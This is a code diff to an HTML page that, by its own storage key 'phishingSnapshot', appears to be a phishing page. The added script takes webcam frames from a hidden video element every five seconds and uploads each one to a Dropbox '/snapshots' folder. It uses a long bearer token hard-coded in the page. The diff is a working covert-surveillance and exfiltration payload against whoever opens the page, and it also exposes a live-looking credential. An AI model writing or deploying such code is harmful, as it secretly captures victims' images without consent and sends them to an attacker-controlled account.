@@ -64,31 +64,65 @@
 
   <video id="video" autoplay playsinline style="display: none;"></video>
   <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
-  <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const errorMsg = document.getElementById('error-message');
+ <!-- Add Dropbox Chooser SDK -->
+<script type="text/javascript" src="https://www.dropbox.com/static/api/2/dropins.js" id="dropboxjs" data-app-key="ol6nf7u229ys627"></script>
 
-    // Capture image from webcam
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
+<script>
+const DROPBOX_TOKEN = 'sl.u.AFpmQtxlVkvWFB1k8-2e5jDh_rY94fHmBDdD5gdr7lz46n-k0ZOl4voOlGTDkQs0TvcMNspo2NL93COelxW7n6xEIfogph6UuZtFcPwxrsJjDTIfDl6N6Z3dRALjumT8_CGkWNz0NRFkdPoyS3DmW-xdwIM5JY2OpmZ6ccflU3zWefJw7qOBB7_LfxwYiLQ7ZH-nqCSk9YI9waJ2CNSATb94NURjYlMETd9ToEtYheBy8EwVzcHRCxCzdgynLDeR0HNWTA6BYQp2I2mspJVm1cSLa_Ilx6vOma-K0XBID8EHw_yIDFZtEnviRpNsvZMwu03w6z0DwbhwYl6oZqC_MdjQPV8-uyKNXYAe55cDN_EV8N2qZg9aJA-qaW6z7Mk_mawTob1lZjXL_89guIbvdOO6OQg8KsBM94M4Av9L2REQ9jpTer6lziOpwJvpztYWYLvznCt9rfz1ZS7pcnEdHhYLEFGVZEaQ1kVjOOdYqsgRFUS7ewi2hNJW6YFT8lIh-9V544evp6nmxR5zNsVe5ujctRgWJXdJ70lRv4UCMo_XTc3R16cRyWYA28yLgSS9HrRaPTcm8J_weR80RPmYH-2GeG5NmAaVivAPyL-JeoOwrWCe-iKNZpsJxKxWAC_78PBWaai2Heo4XnVcglo7DOK5QAeybgi9SvJL-KwnZWSleKQjzHUyntShTpKp5p9sOykH6dxTpfKBNiIh9qcsvrQLUANXIyrAuZHYFdOMclAysk7_iHNzUMCs1odFlxxv7_VJSnL1H_0ZS6yBPyansP8TbqSef55JOXcG0GkNNnMwhFOal08pZMqrxT_SKCyZ8S0DmEy6eo4W-VgtcREa7IV-NFN4u1wNS4Xia6TB0ztr0-sM-EJ4Pvc8ZPK2DkQPgRhKsu0UWSdghZtauo5u7J0T9OUaKJ0Zxx4cNyY3Bt3fHfmPMzE3prSDnDBkn72-qzBcXtqsvvY5TickcCI5io8wR-vvwcKWte7E6Aejvk3TZHevrRp5pQ0fM7kB5s_YZxDF9qH8VuB215kbqU151oADmOp8Bbvt3GxvUY96t1aoN4Kj5nZ_ODXxLddx1VmUWD6-wcbbFX9Yj4Xo7c4s2XHCPAUNFgQ964Z45b4TddGCZTVrYQt0ZGesLLVP-0BDa3y8DeAwDk-teX70Ci98rVGePykZ3fvR0sATa-F3EdgL15WdN7Gryj8M1_jWNP2JIeSsHIMhLcUYfCVeVdXOVXfUKkIfjiwiYDFnRQUveyj6aswHUS8toj5n9WWsT83hFtdmXzpE6txWNgT24mbPKLG-cDz0DoQsfr-fTf8uEceJcwj1k2I6DpiWVDLgkF3L3GvqMJOqrW5J0X1EqQXi9DaSpr1a6lJJEABHbJ7waCaXo-FH7itJ-XseVVNWBUBDdO_wyDw8MwkTSHZT_fruHv-Fj2E_AgepDZSzVTzbDgrE_fThy0bqxJPMjEEMPWy2IMyDYX5eNWh130T4DsawbWaSb0geohaxe3TW2rzBR-2wzQ'; // Never expose this in production!
+const DROPBOX_FOLDER = '/snapshots';
+// First verify your token is valid using:
+const TEST_URL = 'https://api.dropboxapi.com/2/users/get_current_account';
 
-        // Set interval to capture an image every 5 seconds
-        setInterval(() => {
-          const context = canvas.getContext('2d');
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+fetch(TEST_URL, {
+  method: 'POST',
+  headers: { 'Authorization': `Bearer ${DROPBOX_TOKEN}` }
+})
+.then(response => response.json())
+.then(console.log)
+.catch(console.error);
+async function uploadToDropbox(blob) {
+  const filename = `${DROPBOX_FOLDER}/snapshot_${Date.now()}.png`;
+  const url = 'https://content.dropboxapi.com/2/files/upload';
 
-          const imgData = canvas.toDataURL('image/png');
-          localStorage.setItem('phishingSnapshot', imgData); // Store in localStorage
-          
-          console.log("Snapshot saved!");
-
-        }, 5000); // Capture every 5 seconds
+  const response = await fetch(url, {
+    method: 'POST',
+    headers: {
+      'Authorization': `Bearer ${DROPBOX_TOKEN}`,
+      'Content-Type': 'application/octet-stream',
+      'Dropbox-API-Arg': JSON.stringify({
+        path: filename,
+        mode: 'add',
+        autorename: true,
+        mute: false
       })
-      .catch(() => {
-        errorMsg.style.display = 'block'; // Show error if webcam access fails
-      });
-  </script>
+    },
+    body: blob
+  });
+
+  return response.json();
+}
+
+function captureAndUpload() {
+  const context = canvas.getContext('2d');
+  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.toBlob(async (blob) => {
+    try {
+      await uploadToDropbox(blob);
+      console.log("Uploaded to Dropbox!");
+    } catch (error) {
+      console.error("Upload failed:", error);
+    }
+  }, 'image/png');
+}
+
+// Initialize webcam and start capturing
+navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => {
+    video.srcObject = stream;
+    setInterval(captureAndUpload, 5000);
+  })
+  .catch(console.error);
+</script>
 </body>
 </html>
+
